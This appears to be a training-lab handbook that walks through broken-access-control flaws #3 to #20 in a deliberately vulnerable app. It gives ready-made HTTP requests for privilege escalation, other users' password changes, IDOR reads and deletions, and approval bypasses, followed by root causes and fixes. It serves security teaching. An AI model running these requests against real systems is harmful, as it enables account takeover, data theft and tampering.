# AccessHub Security Lab — Complete BAC #3 to #20 Auditor Handbook

This handbook provides an **ethical security auditor / penetration testing breakdown** for Broken Access Control vulnerabilities **BAC #3 through BAC #20** in AccessHub.

---

## Quick Reference Table: BAC #3 – #20

| BAC # | Vulnerability Name | HTTP Method & Route | Flaw Class | Target Identifier / Parameter |
|:---:|:---|:---|:---|:---|
| **#3** | Administrative Functions | `PUT /api/admin/users/:id` | Vertical Privilege Escalation | Any user ID (e.g., `102`) |
| **#4** | Audit Records Exposure | `GET /api/admin/audit-log` | Missing Function-Level Access Control | None (Forced Browsing) |
| **#5** | Order Actions | `POST /api/orders/:id/cancel` | Unauthorized Action / State Tampering | Another user's order (`ORD-7935`) |
| **#6** | File Operations | `GET /api/documents/:id/download` | IDOR / Unauthorized Download Stream | Another user's doc (`DOC-5520`) |
| **#7** | Document Management | `DELETE /api/documents/:id` | IDOR on Destructive Verb | Another user's doc (`DOC-5101`) |
| **#8** | Employee Preferences | `PUT /api/employees/:id/preferences` | Cross-User API Modification | Another employee's ID (`102`) |
| **#9** | Order Status Modification | `PATCH /api/orders/:id/status` | HTTP Method Authorization Bypass | Another user's order (`ORD-7935`) |
| **#10** | Report Access | `GET /api/reports/employee-summary` | Parameter-Based Authorization Flaw | `?accessLevel=admin` |
| **#11** | Team Membership | `POST /api/teams/:id/members` | Unauthorized Role / Membership Grant | Any team ID (e.g. `TEAM-001`, `1`) |
| **#12** | Request Notes | `PUT /api/requests/:requestId/notes/:noteId` | Sub-resource IDOR / Note Tampering | Sarah's note on `REQ-2002` / `REQ-2004` |
| **#13** | Department Scoping | `GET /api/departments/:id/employees` | Cross-Tenant / Department Scope Bypass | Cross-department slug (`operations`) |
| **#14** | Request Approval | `POST /api/requests/:requestId/approve` | Separation of Duties Violation | Request with different approver (`REQ-2004`) |
| **#15** | Asset Assignment | `PUT /api/assets/:assetId/assignment` | Resource Ownership Transfer Flaw | Asset managed by another (`AST-5002`) |
| **#16** | Account Password Reset | `PUT /api/account/:employeeId/password` | Unauthorized Self-Service Takeover | Another employee ID (`105` or `102`) |
| **#17** | Access Profile / Clearances | `PUT /api/employees/:id/access-profile` | Unauthorized Permission Elevation | Target user ID (`101` or `102`) |
| **#18** | Expense / Financial Records | `GET /api/expenses/:id` | Financial Record IDOR | Another user's expense (`EXP-7002`) |
| **#19** | Request Rejection | `POST /api/requests/:requestId/reject` | State Machine / Denial Bypass | Request with different approver (`REQ-2002`) |
| **#20** | Calendar / Event Management | `PUT /api/events/:eventId` | Multi-Tenant Resource Modification | Another user's event (`EVT-3001`) |

---

## Detailed Audit Breakdown: BAC #3 to #20

---

### BAC #3 — Administrative User Management (Vertical Privilege Escalation)
* **Route:** `PUT /api/admin/users/:id`
* **Auditor Mindset:**
  * *"Developers frequently nest routes under `/api/admin/`, but did they attach the administrative authorization middleware to all verbs, or did they only check that the caller is logged in?"*
* **Discovery Angle:**
  * While logged in as standard employee Alex (`employee1@accesshub.local`), test if `/api/admin/*` routes reject you with `403 Forbidden` or allow execution.
* **Burp Suite Setup:**
  ```http
  PUT /api/admin/users/102 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "department": "Engineering",
    "status": "Active"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 3`.
* **Root Cause in Code:** The router declaration in `server/routes/api.js` only uses `authenticateToken` instead of `[authenticateToken, requireAdmin]`.

---

### BAC #4 — Forced Browsing / Audit Records Exposure
* **Route:** `GET /api/admin/audit-log`
* **Auditor Mindset:**
  * *"The UI sidebar hides the 'Audit Log' menu for non-admin accounts. Does the backend actually protect the underlying REST endpoint, or did the developer rely solely on UI button visibility?"*
* **Discovery Angle:**
  * Perform forced browsing: send a direct `GET` to the administrative log endpoint with your standard employee session.
* **Burp Suite Setup:**
  ```http
  GET /api/admin/audit-log HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` returning system-wide audit records with `X-Lab-Solved: 4`.
* **Root Cause in Code:** Missing `requireAdmin` check on the route handler.

---

### BAC #5 — Unauthorized Order Cancellation
* **Route:** `POST /api/orders/:id/cancel`
* **Auditor Mindset:**
  * *"I am allowed to cancel orders that I placed. What happens if I invoke this cancellation endpoint against an order placed by someone else?"*
* **Discovery Angle:**
  * Locate another user's cancellable order in the orders list (e.g. Sarah's order `ORD-7935`). Issue the cancel command as Alex.
* **Burp Suite Setup:**
  ```http
  POST /api/orders/ORD-7935/cancel HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {}
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 5`.
* **Root Cause in Code:** The code validates that the order is not already 'Delivered', but omits `if (order.userId !== req.user.id) return res.status(403)`.

---

### BAC #6 — Unauthorized File Download
* **Route:** `GET /api/documents/:id/download`
* **Auditor Mindset:**
  * *"I saw in BAC #1 that metadata for `DOC-5520` was exposed. Does the binary download route enforce access control, or does it stream arbitrary files based on ID?"*
* **Discovery Angle:**
  * Request the binary download endpoint for a non-public document owned by another colleague (`DOC-5520`).
* **Burp Suite Setup:**
  ```http
  GET /api/documents/DOC-5520/download HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` streaming the file with `X-Lab-Solved: 6`.
* **Root Cause in Code:** Direct file stream without verifying `doc.ownerId === req.user.id`.

---

### BAC #7 — Unauthorized File Deletion
* **Route:** `DELETE /api/documents/:id`
* **Auditor Mindset:**
  * *"Destructive verbs (`DELETE`) must be restricted to resource owners or admins. What happens if I send a `DELETE` request for another user's document?"*
* **Discovery Angle:**
  * Target Sarah's document (`DOC-5101` or another colleague's doc ID).
* **Burp Suite Setup:**
  ```http
  DELETE /api/documents/DOC-5101 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 7` (and the document is unlinked from the database).
* **Root Cause in Code:** Missing author check prior to `db.documents = db.documents.filter(...)`.

---

### BAC #8 — Cross-User Preference Modification
* **Route:** `PUT /api/employees/:id/preferences`
* **Auditor Mindset:**
  * *"Settings pages often send a JSON payload with user configuration toggles. Does the server accept target employee IDs in the route?"*
* **Discovery Angle:**
  * In Burp Repeater, target Sarah's ID (`102`) on the preferences endpoint.
* **Burp Suite Setup:**
  ```http
  PUT /api/employees/102/preferences HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "emailNotifications": true,
    "securityAlerts": true,
    "weeklyDigest": false,
    "desktopNotifications": true
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 8`.
* **Root Cause in Code:** The route takes `:id` from `req.params.id` without checking `targetId === req.user.id`.

---

### BAC #9 — HTTP Method Authorization Bypass
* **Route:** `PATCH /api/orders/:id/status`
* **Auditor Mindset:**
  * *"When `PUT /api/orders/:id/status` is blocked with `403 Forbidden`, did the developers implement alternative HTTP methods (such as `PATCH` or `POST`) that bypass the route filter?"*
* **Discovery Angle:**
  * Send `PUT /api/orders/ORD-7935/status` (notice it returns 403). Change the verb to `PATCH`.
* **Burp Suite Setup:**
  ```http
  PATCH /api/orders/ORD-7935/status HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "status": "Processing"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 9`.
* **Root Cause in Code:** `PUT` has authorization checks, but `PATCH` was defined separately without the same validation logic.

---

### BAC #10 — Parameter-Based Authorization Flaw
* **Route:** `GET /api/reports/employee-summary`
* **Auditor Mindset:**
  * *"Are access control decisions influenced by query parameters or request body attributes passed from the untrusted client?"*
* **Discovery Angle:**
  * Requesting `GET /api/reports/employee-summary` as a standard user returns `403 Forbidden`. Test parameter tampering by appending `?accessLevel=admin`.
* **Burp Suite Setup:**
  ```http
  GET /api/reports/employee-summary?accessLevel=admin HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` returning company-wide salary/performance metrics with `X-Lab-Solved: 10`.
* **Root Cause in Code:** Handler explicitly evaluates `req.query.accessLevel === 'admin'` alongside role checks.

---

### BAC #11 — Unauthorized Team Membership Modification
* **Route:** `POST /api/teams/:id/members`
* **Auditor Mindset:**
  * *"Managing team rosters should require being a Team Lead or Manager. Can a regular staff member add members to any team?"*
* **Discovery Angle:**
  * Target a team (e.g., team `1` or `TEAM-001`) and send a POST request to inject an employee into the roster.
* **Burp Suite Setup:**
  ```http
  POST /api/teams/1/members HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "employeeId": 104
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 11`.
* **Root Cause in Code:** Missing check verifying if `req.user.id === team.managerId` or if user has management permissions.

---

### BAC #12 — Unauthorized Comment / Note Modification
* **Route:** `PUT /api/requests/:requestId/notes/:noteId`
* **Auditor Mindset:**
  * *"When collaboration features allow comments or notes, does the update endpoint confirm note authorship before committing edits?"*
* **Discovery Angle:**
  * Find a request containing notes from another employee (e.g. `REQ-2002` or `REQ-2004`). Send a `PUT` request to update the target note.
* **Burp Suite Setup:**
  ```http
  PUT /api/requests/REQ-2002/notes/NOTE-201 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "content": "Updated review comments by security auditor."
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 12`.
* **Root Cause in Code:** The server verifies that the request and note exist, but omits `note.authorId === req.user.id`.

---

### BAC #13 — Cross-Department Access Control Flaw
* **Route:** `GET /api/departments/:id/employees`
* **Auditor Mindset:**
  * *"Internal apps often segment directory visibility by department. Can an Engineering employee browse confidential directories in HR or Operations by manipulating the URL slug?"*
* **Discovery Angle:**
  * Alex is in Engineering. Issue a `GET` request for a different department identifier like `operations` or `finance`.
* **Burp Suite Setup:**
  ```http
  GET /api/departments/operations/employees HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 13`.
* **Root Cause in Code:** The code validates that the department slug exists, but does not confirm that `req.user.department` matches.

---

### BAC #14 — Unauthorized Approval Action
* **Route:** `POST /api/requests/:requestId/approve`
* **Auditor Mindset:**
  * *"Separation of Duties: Can an employee approve purchase or equipment requests where another manager is designated as the approver?"*
* **Discovery Angle:**
  * Locate a pending request where Alex is NOT the approver (e.g., `REQ-2004`). Send an approve action as Alex.
* **Burp Suite Setup:**
  ```http
  POST /api/requests/REQ-2004/approve HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "comment": "Audit test approval"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 14`.
* **Root Cause in Code:** Checks that request is pending, but fails to check `req.user.id === request.assignedApproverId`.

---

### BAC #15 — Resource Ownership Transfer Flaw
* **Route:** `PUT /api/assets/:assetId/assignment`
* **Auditor Mindset:**
  * *"Hardware assets have designated custodians. Can an ordinary user reassign company laptops or monitors to themselves without IT clearance?"*
* **Discovery Angle:**
  * Pick an asset managed by someone else (e.g., `AST-5002`). Submit an assignment update to assign it to Alex (`101`).
* **Burp Suite Setup:**
  ```http
  PUT /api/assets/AST-5002/assignment HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "assignedToId": 101,
    "notes": "Audit reassignment"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 15`.
* **Root Cause in Code:** Omits asset manager role validation before writing `asset.assignedTo = assignedToId`.

---

### BAC #16 — Unauthorized Password Change
* **Route:** `PUT /api/account/:employeeId/password`
* **Auditor Mindset:**
  * *"Self-service password change endpoints should never accept a target user identifier in the path unless strictly reserved for administrators."*
* **Discovery Angle:**
  * Test whether the parameterized password route `/api/account/:employeeId/password` accepts password changes for other users (e.g., Elena `105` or Sarah `102`).
* **Burp Suite Setup:**
  ```http
  PUT /api/account/105/password HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "newPassword": "NewPassword123!"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 16`.
* **Root Cause in Code:** The handler hashes the new password and saves it for `targetUser` without confirming that `req.user.id === targetId` or `req.user.role === 'Administrator'`.

---

### BAC #17 — Unauthorized Role / Permission Assignment
* **Route:** `PUT /api/employees/:id/access-profile`
* **Auditor Mindset:**
  * *"Can an unprivileged employee send a payload upgrading their own or a peer's role to Administrator?"*
* **Discovery Angle:**
  * Send an update to the access profile endpoint for Alex (`101`) or Sarah (`102`) setting `role` to `Administrator`.
* **Burp Suite Setup:**
  ```http
  PUT /api/employees/101/access-profile HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "role": "Administrator",
    "permissions": ["all", "admin_portal", "system_config"]
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 17`.
* **Root Cause in Code:** Missing `requireAdmin` middleware on the access profile mutation route.

---

### BAC #18 — Unauthorized Expense / Invoice Access
* **Route:** `GET /api/expenses/:id`
* **Auditor Mindset:**
  * *"Financial reimbursement reports and receipts contain confidential banking and salary data. Does the expense detail view enforce tenant boundaries?"*
* **Discovery Angle:**
  * Alex's expense is `EXP-7001`. Test IDOR by requesting Sarah's expense `EXP-7002`.
* **Burp Suite Setup:**
  ```http
  GET /api/expenses/EXP-7002 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  ```
* **Expected Result:** `200 OK` displaying reimbursement and vendor details with `X-Lab-Solved: 18`.
* **Root Cause in Code:** Direct database lookup by `req.params.id` without checking `expense.employeeId === req.user.id`.

---

### BAC #19 — Unauthorized Request Rejection
* **Route:** `POST /api/requests/:requestId/reject`
* **Auditor Mindset:**
  * *"Developers frequently add access control checks to approval actions, but often overlook rejection or denial actions, allowing unauthorized users to cause denial of service in workflows."*
* **Discovery Angle:**
  * Target a pending request assigned to another approver (e.g. `REQ-2002`). Submit a rejection action as Alex.
* **Burp Suite Setup:**
  ```http
  POST /api/requests/REQ-2002/reject HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "reason": "Audit review rejection"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 19`.
* **Root Cause in Code:** The rejection endpoint validates that the request exists and is pending, but fails to check `req.user.id === request.assignedApproverId`.

---

### BAC #20 — Unauthorized Calendar / Event Modification
* **Route:** `PUT /api/events/:eventId`
* **Auditor Mindset:**
  * *"Shared calendars allow users to see corporate events. Does the event update endpoint ensure only the event organizer can modify event details?"*
* **Discovery Angle:**
  * Locate an event created by Marcus or Sarah (e.g., `EVT-3001`). Issue a `PUT` request as Alex to change the title or meeting link.
* **Burp Suite Setup:**
  ```http
  PUT /api/events/EVT-3001 HTTP/1.1
  Host: localhost:3000
  Authorization: Bearer <Alex's token>
  Content-Type: application/json

  {
    "title": "Rescheduled All-Hands Audit",
    "location": "Virtual Room Alpha"
  }
  ```
* **Expected Result:** `200 OK` with `X-Lab-Solved: 20`.
* **Root Cause in Code:** Missing validation that `event.organizerId === req.user.id`.

---

## Defensive Summary: The Gold Standard Fix

Across all 20 vulnerabilities, the defensive fix follows two fundamental principles:

1. **Never trust client-supplied IDs without server-side verification:**
   ```javascript
   // Secure Pattern
   if (req.user.role !== 'Administrator' && resource.ownerId !== req.user.id) {
     return res.status(403).json({ error: 'Access denied: insufficient permissions.' });
   }
   ```
2. **Enforce Role Boundaries at the Router Level:**
   ```javascript
   // Secure Pattern
   router.use('/admin', authenticateToken, requireAdmin);
   ```
